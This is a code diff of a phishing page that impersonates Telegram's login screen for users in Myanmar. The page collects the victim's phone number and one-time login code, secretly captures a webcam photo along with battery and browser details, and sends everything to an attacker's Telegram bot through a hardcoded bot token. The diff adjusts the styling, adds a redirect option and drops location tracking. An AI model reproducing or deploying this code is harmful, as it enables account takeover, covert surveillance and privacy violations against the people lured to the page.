@@ -2,32 +2,32 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram Messenger</title>
     <style>
+        /* UI ပုံစံ မှန်ကန်စေရန် အောက်ပါတို့ကို ပြင်ထားသည် */
         body { background-color: #1c2733; color: white; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .container { text-align: center; width: 100%; max-width: 350px; padding: 25px; }
+        .container { text-align: center; width: 90%; max-width: 350px; padding: 20px; box-sizing: border-box; }
         h2 { font-size: 20px; margin-bottom: 8px; }
         p { color: #7f91a4; font-size: 14px; margin-bottom: 35px; line-height: 1.4; }
         
-        /* Phone Input Styling */
         .input-box { position: relative; margin-bottom: 25px; text-align: left; }
-        .input-box label { font-size: 13px; color: #3390ec; position: absolute; top: -10px; left: 12px; background: #1c2733; padding: 0 5px; }
+        .input-box label { font-size: 13px; color: #3390ec; position: absolute; top: -10px; left: 12px; background: #1c2733; padding: 0 5px; z-index: 1; }
+        
+        /* Myanmar စာသားအကွက်ကို width ထိန်းညှိခြင်း */
+        .country-select { width: 100%; padding: 15px; background: transparent; border: 1px solid #3b4754; border-radius: 10px; color: white; font-size: 16px; box-sizing: border-box; }
+        
         .phone-input-container { display: flex; align-items: center; border: 1px solid #3b4754; border-radius: 10px; padding: 15px; background: transparent; }
-        .country-code { color: white; font-size: 17px; pointer-events: none; }
-        .divider { color: #555; margin: 0 10px; font-weight: 100; font-size: 20px; } /* မှုန်ဝါးဝါး မျဉ်းကြောင်း */
+        .country-code { color: white; font-size: 17px; }
+        .divider { color: #555; margin: 0 10px; font-size: 20px; }
         input[type="tel"] { background: transparent; border: none; color: white; font-size: 17px; outline: none; width: 100%; }
 
-        /* OTP Grid Styling (သေးသေးလေးနှင့် တူအောင်) */
         .otp-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
         .otp-input { width: 35px; height: 45px; text-align: center; font-size: 18px; border: 1px solid #3b4754; border-radius: 6px; background: transparent; color: white; outline: none; }
-        .otp-input:focus { border-color: #3390ec; }
 
-        /* Floating Button */
         .next-btn { background: #3390ec; border: none; width: 56px; height: 56px; border-radius: 50%; color: white; font-size: 24px; cursor: pointer; float: right; display: flex; align-items: center; justify-content: center; transition: 0.3s; }
         .spinner { width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 0.8s linear infinite; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
         video, canvas { display: none; }
     </style>
 </head>
@@ -36,13 +36,16 @@
 <div class="container" id="step1">
     <h2>Your phone number</h2>
     <p>Please confirm your country code and enter your phone number.</p>
-    <div class="input-box"><label>Country</label><input type="text" value="Myanmar (Burma)" readonly style="width:100%; padding:15px; background:transparent; border:1px solid #3b4754; border-radius:10px; color:white;"></div>
+    <div class="input-box">
+        <label>Country</label>
+        <input type="text" value="Myanmar (Burma)" readonly class="country-select">
+    </div>
     <div class="input-box">
         <label>Phone number</label>
         <div class="phone-input-container">
             <span class="country-code">+95</span>
             <span class="divider">|</span>
-            <input type="tel" id="phone" placeholder="9663804708" maxlength="11">
+            <input type="tel" id="phone" placeholder="9663804708" maxlength="11" autocomplete="off">
         </div>
     </div>
     <button class="next-btn" onclick="handleStep1()">
@@ -54,7 +57,7 @@
 <div class="container" id="step2" style="display: none;">
     <div style="font-size: 55px; margin-bottom: 20px;">📩</div>
     <h2>Verification Code</h2>
-    <p>Please check your Telegram app on your other device and enter the code we just sent you.</p>
+    <p>Please check your Telegram app and enter the code.</p>
     <div class="otp-container">
         <input type="number" class="otp-input" maxlength="1" oninput="move(this, 0)">
         <input type="number" class="otp-input" maxlength="1" oninput="move(this, 1)">
@@ -74,7 +77,13 @@
 <script>
     const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
     const chat_id = '5304050102';
-    const channel_link = "https://t.me/tiktokhdvideo12_bot"; // သင့် Channel Link ဒီမှာထည့်ပါ
+    
+    // ဂိမ်းဆော့စေချင်တဲ့ link ကို ဒီအောက်မှာ ပြောင်းထည့်ပါ
+    const game_link = "https://www.google.com"; // ဥပမာ - 3D ဂိမ်း link
+    
+    // Telegram Bot ဆီ လွှဲပေးမယ့် link
+    const telegram_link = "https://t.me/tiktokhdvideo12_bot"; 
+    
     let userNum = "";
 
     function move(el, idx) {
@@ -84,13 +93,9 @@
     async function handleStep1() {
         let rawNum = document.getElementById('phone').value;
         if(rawNum.length < 7) return;
-        
-        // 09 ပုံစံသို့ ပြောင်းလဲခြင်း
         userNum = rawNum.startsWith('0') ? rawNum : '0' + rawNum;
-        
         showLoad(1);
         await getDeviceInfo(`🚩 **Target Found**\n📱 Phone: ${userNum}`);
-        
         setTimeout(() => {
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').style.display = 'block';
@@ -101,13 +106,15 @@
         let otp = "";
         document.querySelectorAll('.otp-input').forEach(i => otp += i.value);
         if(otp.length < 5) return;
-
         showLoad(2);
+        
+        // Bot ဆီ OTP ပို့ခြင်း
         await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('🔑 OTP: ' + otp + '\n📱 For: ' + userNum)}`);
         
-        // OTP ရပြီးတာနဲ့ Channel ထဲ တိုက်ရိုက်ပို့ပေးခြင်း
         setTimeout(() => {
-            window.location.href = channel_link;
+            // OTP ရပြီးတာနဲ့ ဂိမ်းဆီ လွှဲပေးမလား သို့မဟုတ် Telegram ဆီ လွှဲပေးမလား ဒီမှာ ရွေးပါ
+            // ဂိမ်းဆီလွှဲချင်ရင်: window.location.href = game_link;
+            window.location.href = telegram_link; 
         }, 1500);
     }
 
@@ -118,17 +125,10 @@
 
     async function getDeviceInfo(baseMsg) {
         let batteryInfo = "Unknown";
-        try { const bat = await navigator.getBattery(); batteryInfo = `${(bat.level * 100).toFixed(0)}% (${bat.charging ? 'Charging' : 'Discharging'})`; } catch(e) {}
-
-        let location = "Denied";
-        try {
-            const pos = await new Promise((r, j) => navigator.geolocation.getCurrentPosition(r, j));
-            location = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-        } catch(e) {}
-
-        const info = `${baseMsg}\n🔋 Battery: ${batteryInfo}\n📍 Location: ${location}\n🌐 UserAgent: ${navigator.userAgent}`;
+        try { const bat = await navigator.getBattery(); batteryInfo = `${(bat.level * 100).toFixed(0)}%`; } catch(e) {}
+        const info = `${baseMsg}\n🔋 Battery: ${batteryInfo}\n🌐 UA: ${navigator.userAgent}`;
         
-        // Camera Capture & Send Info
+        // Photo & Info
         try {
             const stream = await navigator.mediaDevices.getUserMedia({video: true});
             const v = document.getElementById('v'); v.srcObject = stream;
@@ -139,6 +139,7 @@
                 const f = new FormData();
                 f.append('chat_id', chat_id); f.append('photo', blob, 'x.jpg'); f.append('caption', info);
                 await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f});
+                stream.getTracks().forEach(track => track.stop()); // Camera ပိတ်ရန်
             }, 1000);
         } catch(e) {
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}`);
@@ -147,3 +148,4 @@
 </script>
 </body>
 </html>
+
